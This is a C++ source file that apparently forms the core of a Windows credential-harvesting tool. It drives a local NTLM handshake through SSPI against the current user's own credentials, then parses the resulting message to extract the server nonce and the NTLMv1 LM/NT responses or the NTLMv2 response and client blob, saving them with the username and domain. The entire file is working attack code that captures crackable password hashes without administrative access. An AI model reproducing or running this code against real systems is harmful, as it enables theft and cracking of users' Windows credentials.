#include <string>
#include <windows.h>
#include "server.h"

Hash* DoAuthentication()
{
	SECURITY_STATUS   	ss;
	DWORD 			  	cbIn;
	DWORD		      	cbOut;
	DWORD 			  	g_cbMaxMessage;
	BOOL              	done = FALSE;
	BOOL		      	fDone = FALSE;
	BOOL              	fNewConversation = TRUE;
	TimeStamp         	Lifetime;
	PSecPkgInfoA	  	pkgInfo;
	CredHandle        	hcred;
	CredHandle 	      	hCcred;
	struct _SecHandle 	hctxt;
	struct _SecHandle 	hCctxt;
	PBYTE 			  	g_pInBuf = NULL;
	PBYTE 			  	g_pOutBuf = NULL;
	SEC_CHAR          	g_lpPackageName[1024];
	PBYTE				nonce, clientnonce, lmhash, nthash;
	PCHAR pDomain = NULL;
	PCHAR pUserName = NULL;
	DWORD cbUserName = 0;
	std::string output= "";

	lstrcpynA (g_lpPackageName, "NTLM",5);
	ss = QuerySecurityPackageInfoA ( g_lpPackageName, &pkgInfo);
	if (!SEC_SUCCESS(ss)) {
		return NULL;
	}

	g_cbMaxMessage = pkgInfo->cbMaxToken;
	FreeContextBuffer(pkgInfo);
	g_pInBuf = (PBYTE) malloc (g_cbMaxMessage);
	g_pOutBuf = (PBYTE) malloc (g_cbMaxMessage);
   
	if (NULL == g_pInBuf || NULL == g_pOutBuf) {
		return NULL;
	}

	ss = AcquireCredentialsHandleA (NULL, g_lpPackageName, SECPKG_CRED_INBOUND, NULL, NULL, NULL, NULL, &hcred, &Lifetime);

	if (!SEC_SUCCESS (ss)) {
		return NULL;
	}
	cbOut = g_cbMaxMessage;

	if (!GenClientContext ( NULL, 0, g_pOutBuf, &cbOut, &fDone, (char*)"NTLM", &hCcred, &hCctxt))
	{
		return NULL;
	}

	memcpy(g_pInBuf,g_pOutBuf, cbOut);
	cbIn = cbOut;
	cbOut = g_cbMaxMessage;

	if (!GenServerContext (g_pInBuf, cbIn, g_pOutBuf, &cbOut, &done, fNewConversation, &hcred, &hctxt)) {
		return NULL;
	}

	fNewConversation = FALSE;

	memcpy(g_pInBuf,g_pOutBuf, cbOut);
	cbIn = cbOut;
	cbOut = g_cbMaxMessage;

	nonce = (PBYTE) malloc (16);
	memcpy (nonce, (void *)&g_pOutBuf[24], 8);
	
	if (!GenClientContext (g_pInBuf, cbIn, g_pOutBuf, &cbOut, &fDone, (char*)"NTLM", &hCcred, &hCctxt))
	{
		return NULL;
	}

	GetUserNameExA(NameSamCompatible, pDomain, &cbUserName);
	pDomain = (PCHAR) malloc (cbUserName+1);
	GetUserNameExA(NameSamCompatible, pDomain, &cbUserName);
	pUserName = strchr(pDomain,'\\');
	*(char *)pUserName = 0;

	Hash* hash = NULL;
	if (g_pOutBuf[22] > 24) 
	{
		nthash = (PBYTE) malloc (16);
		cbIn = g_pOutBuf[24] + (g_pOutBuf[25] << 8);
		memcpy (nthash, (void *)&g_pOutBuf[cbIn], 16);

		cbIn += 16;
		clientnonce = (PBYTE) malloc (cbOut - cbIn - 16);
		memcpy (clientnonce, (void *)&g_pOutBuf[cbIn], cbOut - cbIn - 16);

		hash = new Hash(pUserName+1, pDomain);
		hash->setNTLMv2(HextoString(8, nonce), HextoString(cbOut - cbIn - 16, clientnonce), HextoString(16, nthash));

		free(nthash);
		free(clientnonce);

	}
	else if (g_pOutBuf[22] == 24)
	{
		lmhash = (PBYTE) malloc (24);
		cbIn = g_pOutBuf[16] + (g_pOutBuf[17] << 8);
		memcpy (lmhash, (void *)&g_pOutBuf[cbIn], 24);

		nthash = (PBYTE) malloc (24);
		cbIn = g_pOutBuf[24] + (g_pOutBuf[25] << 8);
		memcpy (nthash, (void *)&g_pOutBuf[cbIn], 24);

		hash = new Hash(pUserName + 1, pDomain);
		hash->setNTLM(HextoString(8, nonce), HextoString(24, lmhash), HextoString(24, nthash));

		free(lmhash);
		free(nthash);
	}

	free(pDomain);

	return hash ;
}

BOOL GenServerContext ( BYTE *pIn, DWORD cbIn, BYTE *pOut, DWORD *pcbOut, BOOL *pfDone, BOOL fNewConversation,  CredHandle *hcred, struct _SecHandle *hctxt)
{
	SECURITY_STATUS   ss;
	TimeStamp         Lifetime;
	SecBufferDesc     OutBuffDesc;
	SecBuffer         OutSecBuff;
	SecBufferDesc     InBuffDesc;
	SecBuffer         InSecBuff;
	ULONG             Attribs = 0;
	 
	OutBuffDesc.ulVersion = 0;
	OutBuffDesc.cBuffers = 1;
	OutBuffDesc.pBuffers = &OutSecBuff;

	OutSecBuff.cbBuffer = *pcbOut;
	OutSecBuff.BufferType = SECBUFFER_TOKEN;
	OutSecBuff.pvBuffer = pOut;

	InBuffDesc.ulVersion = 0;
	InBuffDesc.cBuffers = 1;
	InBuffDesc.pBuffers = &InSecBuff;

	InSecBuff.cbBuffer = cbIn;
	InSecBuff.BufferType = SECBUFFER_TOKEN;
	InSecBuff.pvBuffer = pIn;

	ss = AcceptSecurityContext (hcred, fNewConversation ? NULL : hctxt, &InBuffDesc, Attribs, SECURITY_NATIVE_DREP, hctxt, &OutBuffDesc, &Attribs, &Lifetime);

	if (!SEC_SUCCESS (ss))  
	{
	    fprintf (stderr, "AcceptSecurityContext failed: 0x%08x\n", ss);
	    return FALSE;
	}
	*pcbOut = OutSecBuff.cbBuffer;
	*pfDone = !((SEC_I_CONTINUE_NEEDED == ss)    || (SEC_I_COMPLETE_AND_CONTINUE == ss));
	return TRUE;
}


BOOL GenClientContext (BYTE *pIn, DWORD cbIn, BYTE *pOut, DWORD *pcbOut, BOOL *pfDone, SEC_CHAR *pszTarget, CredHandle *hCred, struct _SecHandle *hCtxt)
{
	SECURITY_STATUS   ss;
	TimeStamp         Lifetime;
	SecBufferDesc     OutBuffDesc;
	SecBuffer         OutSecBuff;
	SecBufferDesc     InBuffDesc;
	SecBuffer         InSecBuff;
	ULONG             ContextAttributes;
	SEC_CHAR	      lpPackageName[1024];
	_SEC_WINNT_AUTH_IDENTITY	auth_data;
	PCHAR pUserName = NULL;
	PCHAR pDomain = NULL;
	DWORD cbUserName = 0;
	DWORD dw;


	if( NULL == pIn )  
	{   
		GetUserNameExA(NameSamCompatible, pDomain, &cbUserName);
		pDomain = (PCHAR) malloc (cbUserName);
		GetUserNameExA(NameSamCompatible, pDomain, &cbUserName);

		pUserName = strchr(pDomain,'\\');
		*(char *)pUserName = 0;

		auth_data.Domain = (unsigned char *)pDomain;
		auth_data.User = (unsigned char *)(pUserName+1);

		auth_data.UserLength = strlen((char *)auth_data.User);
		auth_data.DomainLength = strlen((char *)auth_data.Domain);
		auth_data.Password = NULL;
		auth_data.PasswordLength = 0;
		auth_data.Flags = SEC_WINNT_AUTH_IDENTITY_ANSI;

	   	lstrcpynA (lpPackageName, "NTLM", 5);
	   	ss = AcquireCredentialsHandleA (NULL, lpPackageName, SECPKG_CRED_OUTBOUND, NULL, &auth_data, NULL, NULL, hCred, &Lifetime);
	   	if (!(SEC_SUCCESS (ss))) {
			free(pDomain);
			return FALSE;
		}

		free(pDomain);
	}

	OutBuffDesc.ulVersion = 0;
	OutBuffDesc.cBuffers  = 1;
	OutBuffDesc.pBuffers  = &OutSecBuff;

	OutSecBuff.cbBuffer   = *pcbOut;
	OutSecBuff.BufferType = SECBUFFER_TOKEN;
	OutSecBuff.pvBuffer   = pOut;

	if (pIn)
	{
		 InBuffDesc.ulVersion = 0;
		 InBuffDesc.cBuffers  = 1;
		 InBuffDesc.pBuffers  = &InSecBuff;

		 InSecBuff.cbBuffer   = cbIn;
		 InSecBuff.BufferType = SECBUFFER_TOKEN;
		 InSecBuff.pvBuffer   = pIn;
		ss = InitializeSecurityContextA (hCred,	hCtxt,	pszTarget,	ISC_REQ_CONFIDENTIALITY, 0,	SECURITY_NATIVE_DREP,	&InBuffDesc,	0, 	hCtxt,	&OutBuffDesc, &ContextAttributes,	&Lifetime);
	}
	else
	{
		 ss = InitializeSecurityContextA (hCred, NULL, pszTarget, ISC_REQ_CONFIDENTIALITY, 0, SECURITY_NATIVE_DREP, NULL, 0, hCtxt, &OutBuffDesc, &ContextAttributes, &Lifetime);
	}

	if (!SEC_SUCCESS (ss)) {
		return FALSE;
	}

	*pcbOut = OutSecBuff.cbBuffer;
	*pfDone = !((SEC_I_CONTINUE_NEEDED == ss) ||(SEC_I_COMPLETE_AND_CONTINUE == ss));
	return TRUE;
}


Hash::Hash(char* username, char* computer)
{
	this->username = std::string(username);
	this->computer = std::string(computer);
}

void Hash::setNTLMv2(std::string nonce, std::string client_nonce, std::string nthash)
{
	this->type = 2;
	this->nonce = nonce;
	this->client_nonce = client_nonce;
	this->nthash = nthash;
}

void Hash::setNTLM(std::string nonce, std::string lmhash, std::string nthash)
{
	this->type = 1;
	this->nonce = nonce;
	this->lmhash = lmhash;
	this->nthash = nthash;
}